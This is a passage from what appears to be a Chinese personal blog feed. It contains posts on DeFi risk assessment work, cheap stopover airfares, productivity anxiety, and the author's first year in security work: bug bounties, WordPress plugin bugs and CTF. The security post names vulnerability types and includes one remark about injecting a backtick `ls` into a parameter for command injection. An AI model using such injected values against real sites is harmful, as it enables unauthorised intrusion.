title="進入團隊的契機"></a>進入團隊的契機</h3><p>那為什麼之後還是加入了相關的團隊？</p><p>原因之一是我覺得這樣的「討厭」其實很沒道理，我感性上是討厭沒錯，但理性上會覺得這樣的討厭是不對的。我都還沒真正花時間去理解這個產業在幹嘛，有什麼資格討厭？會不會其實這個產業還有很多東西是我沒看到的？會不會我討厭的理由其實不堪一擊，論點站不住腳？</p><p>總之呢，最後會選擇換團隊的理由之一是我覺得可以嘗試看看，反正剛好有機會嘗試，試了就知道。如果試完還是不喜歡，我也有更多站得住腳的證據去支持我的論述。</p><h3 id="我加入的團隊在幹嘛？"><a href="#我加入的團隊在幹嘛？" class="headerlink" title="我加入的團隊在幹嘛？"></a>我加入的團隊在幹嘛？</h3><p>我加入的團隊其實有兩個滿類似卻又不太一樣的工作內容，可以分為以下兩項：</p><ol><li>保險</li><li>DeFi</li></ol><p>先講保險那一塊，我們公司會對加密貨幣產業的公司提供保險，保險的內容不一定，要看是什麼險種。</p><p>假設我們今天要保的是交易所的冷錢包好了，那我需要做的事情就是根據對方提供的資料，去看有哪一些風險，最後統整出一個結果交給其他負責核保的同事。</p><p>舉例來說，可能會給出以下的評估結果：</p><ol><li>在交易轉帳部分權責分離有做好，發起交易跟審核交易是不同人</li><li>有設置交易白名單，更改白名單需要兩人以上同意</li><li>冷錢包的規格符合國際標準，密鑰不容易被取出</li><li>冷錢包存放於保險箱裡面，並且受到 24 小時的監控</li><li>綜合以上結果，他們的系統相對安全</li></ol><p>這部分會看到不少公司的內部文件，因為要看那些文件我們才能做評估，而文件看得多了，自然也就能分出哪些公司不夠完整，安全性可能就沒這麼好。</p><p>除了這些之外，也需要對一些技術去做研究跟評估，例如說 MPC 當時就花了不少時間去看。畢竟要去評估一項技術的安全性之前，你必須對那項技術有一定的理解。</p><p>以上是保險那塊在做的事情，就是對想要買保險的公司去做系統跟技術相關的風險評估。</p><p>而 DeFi 那一塊做的也是風險評估跟研究，但對象是 DeFi 的專案。</p><p>舉例來說，我們可能會去看以前 DeFi 發生過的所有事件，整理出一個分類的清單，例如說「智慧合約漏洞」可能就是一個分類。但其實更仔細去看的話，智慧合約漏洞也有分很多種，例如說重入攻擊啦，或是權限管理沒做好等等的，這些又可以再去細分。</p><p>這樣分完之後就可以整理出一些統計的數據，就能知道過往發生過的事件中哪一種 root cause 發生的比例最高。</p><p>除了針對所有事件做研究跟分類以外，也會針對各個不同類別去做研究，例如說借貸協議好了，什麼是借貸協議？借貸協議通常出事都是因為什麼？</p><p>要先知道這一些先備知識，才能回答最重要的問題：「在評估一個 DeFi 專案的風險時，我們該關注哪些地方？」</p><p>因此也研究了很多 DeFi 相關的東西，看了很多以前出事的案例。</p><p>大概條列式整理一下在工作中學習到的知識：</p><ol><li>交易所常見的系統架構以及交易流程</li><li>HSM 以及 FIPS 140–2&#x2F;3 標準</li><li>MPC 原理以及應用</li><li>DEX 在幹嘛，x*y&#x3D;k 又是什麼？</li><li>LP token 是什麼東西，流動性又是什麼？</li><li>DeFi project 常見漏洞以及原因</li><li>借貸協議是什麼？閃電貸是什麼？</li><li>公鏈是什麼？側鏈是什麼？L0 — L3 是哪些東西？</li><li>Bridge 有哪些實作方式？問題在哪裡？</li><li>Yield Aggregator 是什麼東西？</li></ol><p>雖然說這些東西個別查也可以查到相關資料，但老實說學的時候會發現你要懂 A 必須先懂 B，要懂 B 必須先懂 C，這樣一環扣一環就會需要從頭開始學，其實還滿累的。</p><h3 id="接觸後的感想"><a href="#接觸後的感想" class="headerlink" title="接觸後的感想"></a>接觸後的感想</h3><p>其實還滿有趣的。</p><p>評估交易所風險那邊除了交易標的是加密貨幣以外，其他都是 web2 的範疇。而我說的有趣指的是 DeFi 這一塊。</p><p>DeFi 就是科技加上金融的結合，融合了這兩塊的知識。有許多東西在傳統金融的世界都有，只是經由智慧合約把它變成了 Web3 的樣子。</p><p>它在技術上絕對是有趣的，例如說 bridge 跨鏈橋好了，兩條不同的鏈沒辦法溝通，那要怎麼解決這個問題？像是這個解法就有很多種，每種都有不同的優缺點以及安全性。</p><p>智慧合約這個東西本身也很有趣，藉由區塊鏈的技術來執行程式碼，而且確保了不可修改性，能夠真正做到「code 那樣寫，它就真的那樣跑」，這在傳統 web2 裡面是做不到的。不過雖然可以做到這樣，但又衍伸出來一堆問題，這個等等再談。</p><p>而區塊鏈以及加密貨幣的發展也帶動了一堆密碼學的進步，像是 MPC 雖然以前就有實際應用（丹麥甜菜拍賣跟波士頓薪資調查等等），但目前多數應用還是圍繞在加密貨幣上面，另外像是零知識（Zero Knowledge）的概念也出現在多個 DeFi 相關專案上面。</p><p>除了技術的部分有趣，另一方面它也強迫你要學習一些金融知識。像是 LP token 這東西好了，要理解之前你得要知道 liquidity provider 是什麼，在這之前又要先知道 liquidity 是什麼，這都是傳統金融世界中本來就有的一些知識，但像我以前就從來沒接觸過。</p><p>除了有趣以外，第二個感想就是「發展速度很快」，DeFi 一直都有新的東西出現，我這邊指的不是那種一看就炒幣的，而是真的技術相關的發展，也是不斷推陳出新。</p><p>第三個感想是我發現每個人對區塊鏈以及加密貨幣的願景都不太一樣。</p><p>有些人自始至終都相信加密貨幣會成為一個法幣的替代品，你可以經由加密貨幣進行交易，也可以透過 DeFi 進行許多操作，它是一個去中心化的美好世界，不會受到第三方的干預，也不會有任何人有權利剝奪你的資產。</p><p>而有些人則覺得加密貨幣確實是個值得關注的新東西，但最終都會被政府監管，納入管轄的範疇。或許未來會有政府發行的加密貨幣出現，但它不會是去中心化的。加密貨幣的發展不可能脫離政府的管控，它只是一種新的技術而已。</p><p>這也是我覺得很有趣的一個部分。</p><p>當加密貨幣剛出現沒多久的時候，有些人覺得這個屌打傳統金融，轉帳超快而且手續費低，出入金也快，在傳統金融跟加密貨幣之間來去自如，傳統金融有朝一日一定會被加密貨幣壓在地上打。</p><p>但是當各種事件發生時，似乎體現了政府的監管是必要的？例如說 FTX，一堆人把錢放裡面覺得一定沒事，結果出問題掛掉了，錢能拿回來的可能性微乎其微，這時候就會覺得有政府監管真好，至少有人幫你把關。</p><p>可是一旦被監管就代表有第三方的介入，整個生態就沒這麼去中心化了。我覺得「中心化 vs 去中心化」的這個概念一直都很有趣，而且兩邊都可以有思考的點存在。</p><p>中心化的話你無法保證你自己的資產，可能哪天銀行帳戶被凍結你就沒錢可以用了。去中心化的幣圈世界雖然你的投資可能會血本無歸，但那是你自己的選擇，為自己的選擇付出代價，這沒什麼。</p><p>在去中心化的世界中，哪天 DeFi 專案被找到漏洞被駭，你的錢一樣也不見了。事實上有許多 DeFi 專案其實都逐漸導入一些中心化的控制措施，例如說管理員可以暫停交易或是替換 price oracle 之類的，這些都是希望在緊急狀況時能有第三方介入來接管，阻止災情擴大。</p><p>又或是現在很多合約也都有實作更新的功能，合約如果被發現漏洞可以升級換一個新的合約，這個就跟當初智慧合約主打的「不可竄改」背道而馳了，但應該不少人覺得它是必要的。</p><p>這樣看起來，一定程度的中心化控制似乎還是必要的。完全去中心化的專案可能只活在理想當中，至少現在的發展方向應該是朝著這邊走。</p><h3 id="我自己會繼續投入加密貨幣嗎？"><a href="#我自己會繼續投入加密貨幣嗎？" class="headerlink" title="我自己會繼續投入加密貨幣嗎？"></a>我自己會繼續投入加密貨幣嗎？</h3><p>答案是不會。</p><p>其實本來就沒什麼在投入，只有秉持著「投資用的錢就是你全賠掉都不會讓日子過不下去」的原則偶爾買賣一些垃圾幣當作在買樂透而已。</p><p>在這個職位上看了這麼多以前 DeFi 發生過的事件，就會覺得目前對這個產業沒有什麼信心，滿容易出事的。就算是經過再大的廠商 audit，合約的程式碼還是有可能出錯，一出錯就直接 gg，一堆錢不見。就算合約沒有事情，也有可能是管理員私鑰被盜什麼的，還有其他的攻擊面。</p><p>除了這些以外，還有千百種方式能讓你的錢不見。例如說錢放在交易所結果交易所倒了（FTX 事件），好，那不要放交易所總行了吧？我放自己的錢包，結果錢包被盜了，或是被釣魚然後不小心 approve 了惡意合約，又或是錢包本身產生私鑰的方式不夠安全（Profanity 事件），直接私鑰被猜中，這些都是以前發生過的事件。</p><p>總之呢，我覺得風險還是滿高的，投入一點小錢玩玩當興趣可以，我自己暫時不會想要投入更多資源在裡面。</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>簡單條列式總結一下：</p><ol><li>DeFi 結合了技術以及金融，東西很多變化很多但滿有趣的</li><li>中心化與去中心化的拉扯很有趣</li><li>我自己覺得加密貨幣風險還是滿高，不會想投入</li></ol><p>以上大概就是這 0.75 年的心得。</p><p>前幾天我剛從這個團隊畢業，現在處於工作之間的轉換期，目前暫時也沒打算繼續投入加密貨幣相關的產業，所以搞不好這半年是最後一次這麼認真研究相關的東西了。</p><p>文章開頭我有提到以前滿排斥接觸加密貨幣相關的東西，接觸之後其實有改觀了，但也不確定是什麼影響了我，或許是發現這個圈子還是有很多有技術含量而且好玩的東西吧？</p><p>最後，我真心覺得要入門加密貨幣而且要有一定的理解程度的話，需要花不少時間補充一堆知識。我有打算把前面提過的那些我這段期間學到的東西整理成系列文，簡單講一下我對那些名詞的理解，幫助大家快速入門相關知識，如果有興趣的話可以留言敲碗，會加速文章的產出。</p>]]></content>
      
      
      <categories>
          
          <category> 職涯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>長榮外站出發日本便宜機票購買心得</title>
      <link href="/2022/12/28/cheap-eva-air-ticket-taipei-to-japan-116cc1d68804/"/>
      <url>/2022/12/28/cheap-eva-air-ticket-taipei-to-japan-116cc1d68804/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/cheap-eva-air-ticket-taipei-to-japan-116cc1d68804/0__WEqWmnx65YElO0Np.jpg"></p><p>剛剛買了人生中第一張外站出發去日本的機票，來分享一下心得。</p><p>外站出發的意思是「不從台灣出發」，例如說我買一張雅加達到東京來回機票，這就是外站出發。</p><p>可是為什麼要買外站出發的機票？我住台灣，當然是買台灣到東京來回就好，幹嘛要買一個從雅加達出發的呢？</p><p>沒錯，因為大家都是這樣想，所以外站出發的機票通常會比較便宜，而且有時候會特價。但如果要特別飛到國外再去我想去的目的地，也太麻煩了吧？</p><p>這就要講到「中停」了。</p><p>以長榮航空來說，要從菲律賓馬尼拉飛到東京，是沒有直飛的，一定要在台北轉機，而轉機的定義是停留 24 小時以內都叫轉機。</p><p>而有時候這個轉機可以改成所謂的「中停（Stopover）」，意思是你可以在轉機的地方停留超過 24 小時，但有可能要加價。像我以前買過的一張<a href="/2019/10/14/etihad-a380-auh-icn-first-class-352fdbbc08db/">台北飛歐洲</a>的機票，就是利用中停的規則只需要加一點錢就可以在阿布達比跟首爾多玩幾天。</p><p>所以當我們買馬尼拉到東京的機票時，我們是把轉機改成中停，變成：</p><ol><li>MNL &#x3D;&gt; TPE（1&#x2F;03）</li><li>TPE &#x3D;&gt; HND（02&#x2F;01）</li><li>HND &#x3D;&gt; TPE（02&#x2F;05）</li><li>TPE &#x3D;&gt; MNL（05&#x2F;20）</li></ol><p>因為是中停，所以可以停上一段時間，不用馬上飛。</p><p>以上面為例，我可以一月份從馬尼拉飛到台北，然後二月再從台北出發前往東京玩個五天，最後五月才「飛回」馬尼拉。</p><p>而第一段一定要搭後面才會生效，所以要自己補一張台北到馬尼拉的單程機票，完成整段旅程。最後一段似乎有些人會選擇不搭（也就是所謂的「跳機」，no show），總共就是兩趟旅程。</p><p>如果選擇搭的話，就是補台北到馬尼拉來回機票，總共變成三趟旅行。</p><p>若是你不想去馬尼拉兩次，其中一個可以改成宿霧，票價通常不會差太多，還可能會變更便宜。</p><p>前面講了這麼多，直接來看個範例。</p><p><img src="/img/cheap-eva-air-ticket-taipei-to-japan-116cc1d68804/1__vanQC3qKNldJKax1drkzeA.png"></p><p>假設我突然想在一月中這個熱門時段去札幌玩，1&#x2F;13 ~ 1&#x2F;18 買一張台北札幌來回機票，虎航要 13k，一般航空像是星宇或是長榮要 20k，貴鬆鬆。</p><p>但是如果我從宿霧出發的話呢？</p><p><img src="/img/cheap-eva-air-ticket-taipei-to-japan-116cc1d68804/1__vG6F7vEayHLCU3__wz9deBQ.png"></p><p>中間那兩段台北日本的日期一模一樣，只是前面加了一段宿霧單程，後面加了一段馬尼拉單程，只要 12k，直接少掉 8000 塊！</p><p>這時候我只要再補一張台北到宿霧 &#x3D;&gt; 馬尼拉到台北的來回機票大約 10k，就可以變成下面的行程：</p><ol><li>一月初台北宿霧來回</li><li>一月中台北札幌來回</li><li>四月台北馬尼拉來回</li></ol><p>三趟完整的旅行，加起來機票錢只要 22k，跟你直接買台北札幌來回差不多！這樣看的話，等於前後兩趟菲律賓旅遊就是送的。</p><p>（話說你也可以不用排這麼近，你可以一月去宿霧，四月去札幌，六月去馬尼拉，這也行）</p><p>不過能這樣買的前提是你本來就不排斥到菲律賓去旅行，才有特價的感覺。如果你根本就不想或是沒有時間跑去其他地方，那確實感覺不到好處，只會覺得「我幹嘛多跑一個地方」。</p><p>另外，馬尼拉可以換成其他東南亞國家，像是泰國、新加坡、印尼也都可以，只是票價會不一樣，札幌也可以換成東京、關西等地，可以自由做做看排列組合，看看哪種最適合你又超值。</p><p>像我會寫這篇文章，就是因為我剛剛就買了上面講的組合，一月中要去札幌朝聖初戀景點了。</p><p>最後，雖然我本來就知道外站出發會比較便宜，但是之前沒有自己買過，是看了這個粉專的分享才去查的，在此遠端感謝一下：<a href="https://www.facebook.com/permalink.php?story_fbid=pfbid02cXycPj6nQXChka7EVzVBdHeGYVSbyxEAx7MBVuw6nPkTrnNsbp82qscfb2AFLjP8l&id=100063507799495">https://www.facebook.com/permalink.php?story_fbid&#x3D;pfbid02cXycPj6nQXChka7EVzVBdHeGYVSbyxEAx7MBVuw6nPkTrnNsbp82qscfb2AFLjP8l&amp;id&#x3D;100063507799495</a></p>]]></content>
      
      
      <categories>
          
          <category> 旅遊 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 旅遊 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>你過得太安逸了</title>
      <link href="/2022/12/18/you-live-too-comfortably-de6b51fa9875/"/>
      <url>/2022/12/18/you-live-too-comfortably-de6b51fa9875/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/you-live-too-comfortably-de6b51fa9875/0__sZnmB4ZskZMPlIx5.jpg"></p><p>大概是從一兩年前開始，覺得生活的主導權並不在自己身上。</p><p>所謂的主導權，我指的是「我想做什麼，就能去做什麼」的能力。想當初 YouTube 剛紅起來的時候，我也只是當個休閒娛樂在看，頂多吃飯配著看個半小時一小時，就關掉電視去做其他事情了。</p><p>可是現在不同了。</p><p>不知不覺中，注意力已經被 YouTube 分散掉了。現在總是六點多開始吃晚餐，吃完大概七點多，想說離八點不遠，再看個 YouTube 廢片好了，就看到晚上八點了。難怪我一直覺得晚上的時間不太夠用，因為悄悄地被 YouTube 偷走了一個小時。</p><p>俗話說「抖音一響，父母白養」，上面一堆沒什麼營養的廢片，到底有什麼好看的？雖然說我一開始也是抱持著這種心情，但不可否認的是，山寨版抖音 YouTube Shorts 的影片我有時候也是看得很開心，而且滑著滑著，半小時甚至是一個小時就不見了。我充分可以理解為什麼很多人會在上面花這麼多時間，因為不得不說確實滿好看的。</p><p>至於為什麼好看，其中一點是有些影片的內容本來就不錯，例如說各種運動的精彩片段、精湛的舞蹈或是動聽的歌聲等等，另一點就是它很短，所以你不會覺得花很多時間在上面，跟 YouTube 那種你一片就要看個十分鐘以上不同。</p><p>不過話雖如此，每一片短短的，加起來還是很可觀的。像我剛剛提到的一樣，有時候看著看著也是半小時就過去了。</p><p>我的時間就這樣被這些沒有營養的東西給偷走了，我為此感到罪惡。</p><p>話又說回來，為什麼我會對這些我認為被偷走的時間感到罪惡？無非就是我覺得「這些時間應該拿去做一些更有意義的事情才是正確的」，例如說看書、精進技術，或是寫寫文章之類的，做一些更有生產力的事情，這樣才是正確的。</p><p>「你過得太安逸了」</p><p>比起三四年前的自己，這句話是正確的。我現在沒有教學的東西要忙，沒有一個月固定產一篇文章的壓力、沒有技術週刊要放文章，也懶得去修一些線上課程，如果沒有打 CTF 的話，那部落格大概都快長草了。</p><p>是，是太安逸了，但是不行嗎？</p><p>為什麼一定要做一些有生產力的事情呢？為什麼一定要持續進步？這個進步是有盡頭的嗎？</p><p>四五年前我剛出社會的時候，年薪 50 萬，比起那些動不動就百萬年薪的鄉民低多了。後來變成 70，再來變成 130，然後慢慢越漲越高，卻還是能在各個版上看到更高的數字。</p><p>那是不是代表這一條路是永無止盡的？就算進了 Google 或是 Meta 這種令人欽羨的公司，你還是會羨慕著比你更高階的人。你拿 200 也好，400 也好，當你到了那個等級，總是會認識一些更高的，比你賺更多錢的，讓你覺得自己好像還不夠，還有努力空間。</p><p>「永遠都不夠」這件事，往好處想可以是「我可以一直進步」，往另一面想就是「我到什麼時候才能停下來？」。</p><p>意識到這件事情是多麽空虛以後，我不禁想說一聲「我不想努力了」，我想停在這邊就好，拿一個不會餓死的薪水，就這樣停在這個階段，不是也滿好的嗎？</p><p>雖然說我很想這樣做，但我做不到。原因跟我一年半前在《<a href="/2021/02/12/happy-new-year-moo-e0e0ac5130e2/">只是想寫一下</a>》裡面提到的差不多：</p><blockquote><p><em>我沒有覺得大家都一定要繼續前進，停在原地也是自己的選擇，而這選擇沒有對錯。但對我自己來說，我就是沒辦法接受自己原地踏步。所以如同開頭所說的，在這種心不足力也不足的狀態之下，才會感受到不安與愧疚吧，覺得自己應該做點事，可是卻又提不起勁來。</em></p></blockquote><p>一年半過去了，看來自己還是沒有改變，沒有辦法接受就這樣停住而不再前進，被自己逼著繼續前進。若是因為各種因素，沒有辦法前進的時候，就會感到焦慮。</p><p>這應該就是為什麼我花太多時間在 YouTube 上會有罪惡感，因為我潛意識裡面覺得那是不對的，我應該要把這些時間拿去做一些更有生產力的事情。</p><p>這樣的模式似乎會發展出一個惡性循環，就是：</p><ol><li>覺得要做一些有生產力的事情</li><li>太懶了做不到</li><li>做更多無意義的事情打發時間</li><li>感到罪惡</li><li>回到第一步</li></ol><p>要斷開鎖鏈，無非就是：</p><ol><li>打從心底接受沒有前進的自己</li><li>開始做一些有生產力的事情</li></ol><p>而目前我兩樣都沒做到，或許《<a href="https://www.chunfuchao.com/posts/everything-you-do-is-ultimately-pointless/">我所嘗試的一切終究是徒勞</a>》，雖然裡面的內容我大多數都能夠理解，但至少在這篇截稿之際，我仍然會感到焦慮。</p><p>話又說回來，頻繁思考這類型的事情，大概是這兩三年才開始的，從幾篇我寫過的文章中也可以窺知一二，那為什麼以前的我不會呢？是不是因為太忙，所以根本沒有時間思考這個問題？還是有什麼其他的因素？</p><p>我不知道，這我要再想想看。</p><p>但可以肯定的是，這兩三年間我似乎是有意識地在掙扎著，我想做到的其實是肯定自己的價值，也肯定他人的；並且以過得知足為目標，而不受其他人事物的影響。</p><p>例如說我看到一個我覺得能力比我低的人爬到比我更高的位置，我會說：「祝福你，或許你背後很多努力我看不到，你能到那邊一定是有其實力，我對現況很滿足了，不會想跟你比較」，而不是嫉妒，不是覺得他只是運氣好，不會跟他比較，不會靠著貶低別人來證明自己的價值。</p><p>話說，貶低別人來抬高自己雖然不好，但好像挺快速有效的？只要抱持著「他一定是…（請填入各種理由）」的想法就好，不需要思考背後的脈絡，不需要看見他到底做了哪些努力，只要自以為是的想一想，就可以得出「果然我還是比較厲害的」這個結論。</p><p>前面說我在掙扎著，就代表我目前做不到我想做到的事情。我會嫉妒，我有時會靠著無意識（或有意識）的貶低他人來證明自己的價值，我還沒有自己心裡期望的這麼強大。我不知道是我變了，還是一直以來都是這樣，只是沒有時間去正面直球對決。</p><p>A 桑曾經問過我，怎麼有勇氣把自己這些想法都寫出來，公開在網路上。我說，這沒什麼吧，而且有些東西要寫出來，才能更明白自己在想什麼。再者，現在有好多分享文都是那種「Linkedin 風格」，把自己講得多厲害，卻忽略了故事中那些軟弱、憂鬱以及猶豫不決。但那些被忽略的部分，反而才是我想看的。</p><p>這世界不缺「我超屌，我很強，我做到了」的文章，而是缺乏那些與不願面對的自己奮鬥的故事。比起你怎麼花 N 年做了 M 件事爬到這個位置，我更想知道的是你有沒有猶豫過，有沒有懷疑過自己，後來又是怎麼走過來的。</p><p>不過這都只是個人想法而已，如同我以前說過的「我寫出來，是因為我希望看到這些故事的讀者日後也能寫出來。因為我寫的內容，也是我想看其他人寫的」。</p><p>我的有些文章只是我曾經發生過的故事，有些則是近期的想法或是煩惱，不會有解答，也不會有結論。突然想到一件事，之前有讀者留言還是寄信給我，說感覺我好像最近狀況不太好（？），但其實我是沒有這樣覺得。</p><p>說實在的，近期的生活就是過得很安穩，才導致有了這個「是不是過得太安穩」的想法出現。而這一切都是過程吧，是很正常的現象，或許有一天我會找到答案，也或許不會，搞不好一輩子都在煩惱這個問題，在天秤的兩端搖擺也不一定。</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>近況更新：轉職資安的一年後</title>
      <link href="/2022/11/08/2022-updates-e2a3ae1c9a2e/"/>
      <url>/2022/11/08/2022-updates-e2a3ae1c9a2e/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/2022-updates-e2a3ae1c9a2e/0__KbaEPsqjRGFtp__tr.jpg"></p><p>去年的 6 月 5 號，我在 Medium 發了這篇文章：<a href="/2021/06/05/byebye-front-end-hi-security-fda6be0cb7ce/">暫別前端，重新開始</a>，裡面提到了我從 2021 年 5 月份開始在公司內轉成資安工程師，暫時不寫前端了。</p><p>過了一年半之後，我過得還好嗎？我做得還好嗎？想說來寫篇文章更新一下近況，也順便記錄我這一年之間到底做了哪些事情。</p><h3 id="工作與團隊"><a href="#工作與團隊" class="headerlink" title="工作與團隊"></a>工作與團隊</h3><p>因為公司內部團隊轉調都是同等級轉調居多，而我之前在公司內部是 Principal Engineer，所以轉過去資安團隊以後也是這個身份，成為了空降的小主管。</p><p>說實在的，如果要論在資安業界的經歷的話，我是絕對比不上其他團隊成員，而且剛轉去的時候有許多名詞我根本沒聽過。既然這邊需要時間磨練，一時半刻沒辦法給什麼幫助，就只能想辦法從其他地方下手。</p><p>例如說帶進一些我親身經歷過以後覺得不錯的制度，像是每週開個半小時至一小時的分享會，讓團隊成員彼此分享一下這週看到的新東西或是工作上發現的有趣之處，對整個團隊其實滿有幫助的，可以互相交流一些想法與知識。</p><p>同時，也希望能利用這個 team lead 的身份解決團隊對外溝通的一些問題，例如說管道統一，盡量不再讓其他團隊直接去對到團隊成員，而是先有個統一的窗口（但這個很難做好就是了）。</p><p>除此之外，當進入到一個新團隊的時候，其實有不少事情可以做，例如說：</p><ol><li>盤點目前有的資源與文件</li><li>整理並撰寫出缺少的文件（例如說 on-boarding guide 或是一些流程的制定）</li><li>協助找出團隊目前碰到的問題，以及想個解法</li></ol><p>團隊要有目標，而且成員要知道這個目標，才能往同樣的方向前進。在當時我有訂了幾個目標，例如說有部分時間可以做自己的研究，想做什麼都可以，然後也鼓勵大家複習一下現有的東西並寫寫心得之類的。</p><p>不過在團隊管理這一塊，我一直覺得在「管事」這一塊還行，「管人」就真的很難，管人我指的是你可能需要給他建議，需要幫助他在職涯上能夠成長，這一塊真的難，尤其是你沒有很熟悉這個領域的時候。</p><p>接著來談一下這年在技術上有關的進展好了。</p><h3 id="Bug-Bounty"><a href="#Bug-Bounty" class="headerlink" title="Bug Bounty"></a>Bug Bounty</h3><p>有不少公司有 Bug Bounty Program，簡單來說就是找到漏洞就能夠拿獎金，獎金多寡通常都取決於公司的規模以及漏洞的嚴重程度，例如說一個 Chrome 的高風險漏洞可能就值個幾十萬台幣之類的。</p><p>因為自覺能力不足，所以在選擇目標的時候我先選比較冷門的，感覺機會比較多。因緣際會之下選了 <a href="https://matters.news/">Matters</a> 這個平台，除了冷門以外，它的原始碼都有公開，對我來說會比較擅長一點。</p><p>補充一下，我覺得有當過工程師的如果轉去做資安，優勢之一大概就是看 code 可能會比較快，也比較知道整體在幹嘛。例如說我看 React 專案就知道哪邊是在做什麼，然後哪邊可能比較會有漏洞之類的，算是一個小優勢。</p><p>在 Matters 上面總共找到了 5 個洞，拿到了大概 16k 台幣的獎金 ：</p><ol><li>CORS 設定錯誤</li><li>文章 XSS</li><li>登入頁面 XSS</li><li>GraphQL DoS</li><li>Account Takeover（重設密碼機制有問題）</li></ol><p>也根據這些洞寫了一些心得：</p><ol><li><a href="https://blog.huli.tw/2021/05/25/prevent-xss-is-not-that-easy/">防止 XSS 可能比想像中困難</a></li><li><a href="https://blog.huli.tw/2021/09/26/what-is-open-redirect/">在做跳轉功能時應該注意的問題：Open Redirect</a></li><li><a href="https://blog.huli.tw/2022/01/04/reset-password-vulnerability/">有缺陷的重設密碼機制如何演變成帳號奪取漏洞？以 Matters 為例</a></li></ol><p>另一個我有在打的 Bug Bounty 是徵才網站 <a href="https://glints.com/tw">Glints</a>，會發現他們有 bug bounty 是因為看了別人的 write-up。在 Glints 上面也找到了幾個漏洞，都是跟權限管理有關的，拿到了大概 30k 台幣的獎金，也寫了一篇心得：</p><ol><li><a href="https://tech-blog.cymetrics.io/posts/huli/how-i-hacked-glints-and-your-resume/">關於我在 Glints 找到的高風險漏洞</a></li></ol><p>至於其他在 HackerOne 或是 Intigriti 之類的 program，因為競爭者很多，我就沒有花太多心力下去看。</p><p>話說回來，「比較大的目標洞都被找完了」其實是個不健康的想法，因為大家都這樣想，所以你只要真的去找，就能領先別人一步。再者，有些網站就是因為太大，所以洞才比較好找，有些太小的網站因為功能太少反而沒有洞。</p><p>打 bug bounty 其實滿好玩的，不過比起黑箱測試，我還是比較喜歡白箱一點。黑箱測試很多地方就是去嘗試各種可能性，看會不會有一個中。例如說推特或是 Medium 每天都有一堆人在分享 bug bounty tips，說實在的有很多可能都是剛好某個網站有那個洞，而且站在開發者的角度來看，有些你真的會很懷疑背後是怎麼設計的，怎麼可以設計成這樣。</p><p>不過話又說回來，我覺得這些算是「必要的苦工」就是了，畢竟黑箱你也不知道背後怎麼寫的，只能每種可能性都試過一遍，說不定你參數裡面隨便帶個 ` ls` 就真的 command injection 了。</p><h3 id="WordPress-套件漏洞"><a href="#WordPress-套件漏洞" class="headerlink" title="WordPress 套件漏洞"></a>WordPress 套件漏洞</h3><p>忘記從什麼時間點開始了，我突然注意到 <a href="https://wpscan.com/wordpress-security-scanner">WPScan</a> 這個由官方經營的網站也可以回報漏洞，而 WordPress 的套件超級多，如果不限制使用人數的話，真的是隨便找都可以有洞。</p><p>而且，如同我前面說的，我比較喜歡在有 source code 的狀況下開始找洞，而 WordPress 每個套件你都可以找到 source code。</p><p>於是那陣子就花了大概兩三週的時間找一些洞，我專注的是一些跟 booking 相關的套件，例如說民宿的訂房套件啦，或是餐廳的訂位套件之類的，最後也認識了這整個生態系，覺得真的滿厲害的。</p><p>WordPress 的使用人數超多，套件也一大堆，成為了一整個生態系，例如說有些公司就是專門靠賣 WordPress 套件來賺錢，也有公司專門做 WordPress 的防禦，例如說：</p><ol><li><a href="https://wpscan.com/wordpress-security-scanner">WPScan</a></li><li><a href="https://www.wordfence.com/">Wordfence</a></li><li><a href="https://patchstack.com/">patchstack</a></li></ol><p>而這些網站也提供漏洞回報的服務，例如說 WPScan，你在網站上填入相關資訊以後，他們就會幫你聯絡廠商並申請 CVE 編號，也會在網站上留下紀錄。</p><p>另一間 patchstack 也是類似，而且為了搶先別人一步知道漏洞，還提供漏洞回報者一些獎勵。體驗過就會發現滿有趣的，光是 WordPress 就能養活不少公司。</p><p><img src="/img/2022-updates-e2a3ae1c9a2e/1__zv4CQFcUkOEDVzoyZGEh9Q.png"></p><p>在這段期間找到的洞基本上都是直接從 source code review 的角度下去看，畢竟 WordPress 跑起來很方便，套件要改也很方便，還滿好追蹤的，也有寫幾篇文章記錄一下細節：</p><ol><li><a href="https://tech-blog.cymetrics.io/posts/huli/wordpress-plugin-vikbooking-unauth-rce/">WordPress Plugin VikBooking &lt;&#x3D; 1.5.3 Unauthorized RCE 漏洞細節</a></li><li><a href="https://tech-blog.cymetrics.io/posts/huli/wordpress-plugin-amelia-sensitive-information-disclosure/">WordPress Plugin Amelia &lt; 1.0.49 敏感資訊洩露漏洞細節</a></li></ol><p>然後剛開始找的時候我有看到這篇很帥：<a href="https://kazet.cc/2022/02/03/fuzzing-wordpress-plugins.html">A technique to semi-automatically discover new vulnerabilities in WordPress plugins</a>，用半自動的方式去找出像是 XSS 或是 SQL injection 這樣的漏洞。</p><p>我本來想說可以試試看用 CodeQL 來做，但後來發現還不支援 PHP，殘念。</p><p>不過說實在的，我覺得用人工的方式去找這些小套件的洞其實不太划算，只是因為我很菜所以才這樣做，鍛鍊一下經歷。比較理想的方式應該是自動化或是半自動化去找，大一點的套件（一百萬個安裝以上的那種）才用人工去找，應該會是效益較高的做法。</p><h3 id="工作上碰到的漏洞"><a href="#工作上碰到的漏洞" class="headerlink" title="工作上碰到的漏洞"></a>工作上碰到的漏洞</h3><p>除了上面這些，因為工作內容之一是滲透測試，所以也有找了不少洞，但畢竟工作上的東西都需要保密，細節就不多講了。</p><p>在工作上做這些也還是滿有趣的，畢竟面對的是真實世界的網站以及服務，打到洞的時候也滿有成就感的。</p><h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><p>在這一年間玩得最認真也進步最快的，應該就是 CTF 了。不熟悉什麼是 CTF 的話，可以參考我之前寫過的：<a href="https://blog.techbridge.cc/2021/02/20/web-ctf-is-fun/">該如何入門 CTF 中的 Web 題？</a></p><p>之前本來打 CTF 都是自己當作興趣打打，反正也拿不了名次，只打自己喜歡的題目，想不出來就果斷放棄。</p><p>然而，在 2022 年 2 